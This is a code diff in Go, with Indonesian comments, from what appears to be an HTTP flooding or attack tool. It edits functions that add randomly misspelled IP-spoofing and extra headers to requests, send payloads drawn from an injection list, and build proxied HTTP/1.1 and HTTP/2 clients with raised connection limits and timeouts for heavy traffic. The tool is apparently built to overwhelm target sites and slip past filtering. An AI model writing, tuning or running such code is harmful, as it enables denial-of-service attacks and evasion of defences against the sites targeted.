@@ -148,7 +148,6 @@ func randomHeaders(u string, base string) http.Header {
         "Via",
     }
 
-    // Inject IP spoofing headers secara acak dengan typo
     for _, h := range ipHeaders {
         if mrand.Intn(2) == 0 {
             m[randomTypo(randomCase(h))] = ip()
@@ -190,7 +189,6 @@ func randomHeaders(u string, base string) http.Header {
         "X-Original-Host",
     }
 
-    // Tambahkan extra headers secara random
     for _, h := range extraHeaders {
         if mrand.Intn(2) == 0 {
             m[randomTypo(randomCase(h))] = randomHex(8)
@@ -315,17 +313,22 @@ func randomPayload() string {
         return "input=" + url.QueryEscape(injections[mrand.Intn(len(injections))])
     }
 }
-
-// -- HTTP/1.1 & HTTP/2 Client --
 func makeClient(proxyAddr string, useH2 bool, tlsConf *tlsutls.Config) *http.Client {
     tr := &http.Transport{
-        TLSHandshakeTimeout: 10 * time.Second,    // Ditingkatkan
+        TLSHandshakeTimeout: 30 * time.Second,    // Tingkatkan timeout
         DisableKeepAlives:   false,
-        MaxIdleConns:        1000,                // Ditingkatkan
-        MaxConnsPerHost:     1000,                // Ditingkatkan
-        IdleConnTimeout:     90 * time.Second,    // Ditingkatkan
+        MaxIdleConns:        2000,                // Tingkatkan
+        MaxConnsPerHost:     1000,                // Sesuaikan
+        IdleConnTimeout:     120 * time.Second,   // Tingkatkan
         DisableCompression:  true,
         ForceAttemptHTTP2:   useH2,
+        ResponseHeaderTimeout: 30 * time.Second,  // Tambahkan
+        ExpectContinueTimeout: 10 * time.Second, // Tambahkan
+        DialContext: (&net.Dialer{
+            Timeout:   30 * time.Second,
+            KeepAlive: 30 * time.Second,
+            DualStack: true,
+        }).DialContext,
     }
 
     if proxyAddr != "" {
@@ -347,7 +350,7 @@ func makeClient(proxyAddr string, useH2 bool, tlsConf *tlsutls.Config) *http.Cli
 
     return &http.Client{
         Transport: tr,
-        Timeout:   30 * time.Second,      // Ditingkatkan
+        Timeout:   60 * time.Second,      // Tingkatkan timeout
         CheckRedirect: func(req *http.Request, via []*http.Request) error {
             if len(via) >= 10 {
                 return http.ErrUseLastResponse
@@ -355,7 +358,7 @@ func makeClient(proxyAddr string, useH2 bool, tlsConf *tlsutls.Config) *http.Cli
             return nil
         },
     }
-}
+}           
 
 func makeDirectClient(useH2 bool, tlsConf *tlsutls.Config) *http.Client {
     dialTLS := func(network, addr string) (net.Conn, error) {
